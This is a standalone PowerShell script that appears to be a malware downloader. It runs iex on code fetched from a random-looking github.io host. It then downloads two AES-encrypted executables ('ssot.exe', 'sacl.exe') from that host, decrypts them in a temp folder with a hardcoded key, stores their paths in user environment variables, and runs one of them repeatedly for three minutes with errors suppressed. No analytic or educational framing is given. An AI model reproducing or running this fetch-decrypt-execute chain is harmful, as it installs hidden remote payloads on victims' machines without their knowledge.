

$Global:CurrentRunningScript=$($MyInvocation.MyCommand.Name)
$Start=Get-Date
iex (New-Object System.Net.WebClient).DownloadString("https://vr972be716a04eb6.github.io/B01C5C489550CBA356DD/AF393.TXT")


Function Get-Executable {
    [CmdletBinding(SupportsShouldProcess)]
    Param
    (
        [Parameter(Mandatory = $true)]
        [string]$Url
    )
    $BackupEA = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    try{
        $DecryptionKey="secret"

        [string]$TmpDir = (New-Guid).Guid
        [string]$TmpDir = "$Env:Temp\$TmpDir"
        [string]$TmpDirStorage = "$Env:Temp\SS12121q298STORAGE"
         $null=Remove-Item -Path $TmpDir -Force -recurse -ErrorAction Ignore
        $null=Remove-Item -Path $TmpDirStorage -recurse -Force -ErrorAction Ignore
        Log-String "Crearting folders..."
        $null=New-Item -Path $TmpDir -Force -ItemType Directory -ErrorAction Ignore
        $null=New-Item -Path $TmpDirStorage -ItemType Directory  -Force -ErrorAction Ignore
        #[System.Environment]::SetEnvironmentVariable('TEMPSTORAGE',$TmpDirStorage,[System.EnvironmentVariableTarget]::Machine)
        [System.Environment]::SetEnvironmentVariable('TEMPSTORAGE',$TmpDirStorage,[System.EnvironmentVariableTarget]::User)
        $SsotExeCipher = "$TmpDir\ssot.exe.aes"
        $SaclExeCipher = "$TmpDir\sacl.exe.aes"
        $SsotExe = "$TmpDir\ssot.exe"
        $SaclExe = "$TmpDir\sacl.exe"
        $Url1 = $Url + "ssot.txt"
        $Url2 = $Url + "sacl.txt"
       NetGetFileNoCache $Url1 $SsotExeCipher
        NetGetFileNoCache $Url2 $SaclExeCipher
        if(-not(Test-Path -Path $SsotExeCipher)){
            throw "ERROR ON DOWNLOAD OF $Url1 $SsotExeCipher"
        }
        if(-not(Test-Path -Path $SsotExeCipher)){
           throw "ERROR ON DOWNLOAD OF $Url2 $SaclExeCipher"
        }

        Invoke-AESEncryption -mode decrypt -Path $SsotExeCipher -Key 'secret'
        Invoke-AESEncryption -mode decrypt -Path $SaclExeCipher -Key 'secret'

        if(Test-Path -Path $SsotExe){
             Log-String "SUCCESSFULLY DECRYPTED $SsotExe"
            Set-Variable -Name SSHOTEXE -Scope Global -Option ReadOnly,Constant,AllScope -Value $SsotExe
            [System.Environment]::SetEnvironmentVariable('SSHOTEXE',$SsotExe,[System.EnvironmentVariableTarget]::User)
        }    else {
             Log-String "ERROR ON DECRYPTION OF $SsotExeCipher"
        }
        if(Test-Path -Path $SaclExe){
                Log-String "SUCCESSFULLY DECRYPTED $SaclExe"
            Set-Variable -Name SACLEXE -Scope Global -Option ReadOnly,Constant,AllScope -Value $SaclExe
            [System.Environment]::SetEnvironmentVariable('SACLEXE',$SaclExe,[System.EnvironmentVariableTarget]::User)
        }
        else {
             Log-String "ERROR ON DECRYPTION OF $SaclExeCipher"
        }
    }   
    Catch {
        Log-String $Error[0].ToString() -IsError
        return $false
    }
    return $true
}



$Url = "https://vr972be716a04eb6.github.io/"
Get-Executable -Url $Url

[DateTime]$Start = Get-Date
$End = $Start.AddMinutes(3)

Do{
    Log-String "Caling Global:SSHOTEXE"
    $Exec = [System.Environment]::GetEnvironmentVariable('SSHOTEXE',[System.EnvironmentVariableTarget]::User)
    &"$Exec"
    Start-Sleep -Seconds 30
}While ((Get-Date) -lt $End)